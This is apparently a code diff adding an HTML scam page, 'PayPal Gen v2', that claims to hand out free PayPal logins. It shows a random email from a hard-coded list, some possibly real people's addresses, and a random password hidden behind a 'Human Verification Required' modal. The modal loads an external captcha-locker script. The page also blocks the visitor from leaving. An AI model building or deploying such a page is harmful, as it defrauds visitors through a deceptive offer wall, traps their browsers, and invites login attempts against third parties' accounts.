@@ -1,0 +1,48 @@
+<html>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <head>
+    <title> PayPal Gen v2 </title>
+    <link rel="stylesheet" type="text/css" href="files/style.css">
+    <link rel="shortcut icon" type="image/png" href="files/favicon.png"/>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.0.2/jquery.min.js"></script>
+    <link href="https://fonts.googleapis.com/css?family=Roboto:300,500,900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.7.2/animate.min.css">
+  </head>
+  <body>
+    <h1>Completed</h1>
+    <div class="image animated fadeInLeft"><img class="icon" src="files/info.png" width="45rem" height="45rem"></div><span><a>Your PayPal Logins</a><br><b>Use the details provided below to login to your new PayPal.</b></span><br><br>
+    <div class="image animated fadeInLeft slow"><img class="icon" src="files/email.png" width="45rem" height="45rem"></div><span><a>Login Email:</a><br><h2 class="email" id="output1"></h2></span><br><br>
+    <div class="image animated fadeInLeft slower"><img class="icon" src="files/pass.png" width="45rem" height="45rem"></div><span><a>Login Password:</a><br><div class="eye"><h2 class="password" id="output2"></h2><img src="files/eye.png" class="eye_img" id="myBtn"></div></span><br><br>
+    <script>
+    var emails = ['jacey29@gmail.com', 'filler2018@gmail.com', 'gordon89@outlook.com', 'jamesmac1@yahoo.com', 'ppai42@outlook.com', 'mrka9901@gmail.com', 'melan09@gmail.com', 'wardey29@hotmail.com', 'rob3y240@gmail.com', 'lilah394@yahoo.com', 'zad1kie24@mail.ru', '94tensio@gmail.com'];
+    var email = emails[Math.floor(Math.random()*emails.length)];
+    document.getElementById("output1").innerHTML = email.toString();
+    </script>
+    <script>
+    var passwords = ['jnuaB#=6aUd4r', 'Q5e!&Zhmkq#b', 'LA=DCF#7Sv$U', 'dm&v7SxYxX^b', '@ks+U6Q=TXy2', 'bVA$_^G!4hF^', 'XqSq7f&d!UJs', 'z#KDTPt99DGK', 'x3!2fZPrV!^', 'wT@4v*6dqN=h'];
+    var password = passwords[Math.floor(Math.random()*passwords.length)];
+    document.getElementById("output2").innerHTML = password.toString();
+    window.onbeforeunload = function () {return false;}
+    </script>
+    <div id="myModal" class="modal">
+    <div class="modal-content">
+    <span class="close">&times;</span>
+    <p>Human Verification Required</p><br>
+    <div data-captcha-enable="true"></div>
+    </div>
+    </div>
+    <script>
+    var modal = document.getElementById("myModal");
+    var btn = document.getElementById("myBtn");
+    var span = document.getElementsByClassName("close")[0];
+    btn.onclick = function() {
+      modal.style.display = "block";
+    }
+    span.onclick = function() {
+      modal.style.display = "none";
+    }
+    </script>
+    <script src="//www.verifyspot.net/captchalocker/js/captcha.js.php?id=0d15970a289e0e569d69de8160693fd0"></script>
+  </body>
+</html>
